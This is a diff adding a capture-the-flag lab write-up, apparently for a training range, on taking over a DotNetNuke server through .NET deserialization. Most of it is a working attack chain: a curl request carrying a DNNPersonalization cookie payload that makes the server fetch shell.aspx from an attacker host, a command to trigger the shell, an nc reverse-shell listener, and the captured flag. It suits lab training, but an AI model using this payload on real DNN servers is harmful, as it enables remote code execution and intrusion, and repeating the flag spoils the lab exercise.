@@ -1,0 +1,17 @@
+==============================
+== FLAG 1 - The fun begins! ==
+==============================
+Enumerate 10.10.110.0/24 subnet, you will find a DNN server at 10.10.110.10, there is a black hat talk with demos on dotnet deserilization.
+We can find a reverse shell in aspx and upload it to the right directory. You can find that directory by using the read payload looking for web.config.
+payloads: https://gist.github.com/pwntester/72f76441901c91b25ee7922df5a8a9e4
+reverse shell: https://github.com/borjmz/aspx-reverse-shell/blob/master/shell.aspx
+you can also do a bind shell and upload nc.exe.
+Video blackhat talk for demo 3.
+==== This will upload a reverse shell.aspx and run it.
+curl -XGET -s http://10.10.110.10/nonexistent.aspx -b '.ASPXANONYMOUS=8PiZ68vG6wnYbiTnKvnLQH-OSJNEAwTDUe-JfMkStVc2ooH5FztKmAFe_VzdSjoj1rQQJbTYoNh5YsJiFUcaYEqthxOwukK3Zhihc1OT9pqTg4jA0; dnn_IsMobile=False;  DNNPersonalization=<profile><item key="name1:key1" type="System.Data.Services.Internal.ExpandedWrapper`2[[DotNetNuke.Common.Utilities.FileSystemUtils],[System.Windows.Data.ObjectDataProvider, PresentationFramework, Version=4.0.0.0, Culture=neutral, PublicKeyToken=31bf3856ad364e35]], System.Data.Services, Version=4.0.0.0, Culture=neutral, PublicKeyToken=b77a5c561934e089"><ExpandedWrapperOfFileSystemUtilsObjectDataProvider xmlns:xsd="http://www.w3.org/2001/XMLSchema" xmlns:xsi="http://www.w3.org/2001/XMLSchema-instance"><ExpandedElement/><ProjectedProperty0><MethodName>PullFile</MethodName><MethodParameters><anyType xsi:type="xsd:string">http://10.10.14.X/shell.aspx</anyType><anyType xsi:type="xsd:string">C:\dotnetnuke\shell.aspx</anyType></MethodParameters><ObjectInstance xsi:type="FileSystemUtils"></ObjectInstance></ProjectedProperty0></ExpandedWrapperOfFileSystemUtilsObjectDataProvider></item></profile>; language=en-US; __RequestVerificationToken=nZoxsNnVh9524fV8hUcS7Y14Nsl89OvP_JcNwY74h-elV7lHleD9aWNlgdjAb2vA7VMvdA2; USERNAME_CHANGED=' > /dev/null
+sleep 3 && curl http://10.10.110.10/shell.aspx &                                                                                                                            
+nc -lvnp 443  
+=====
+whoami: nt authority\network service
+type C:\DotNetNuke\flag.txt
+Cyb3rN3t1C5{De$3R!al!z@ti0n}
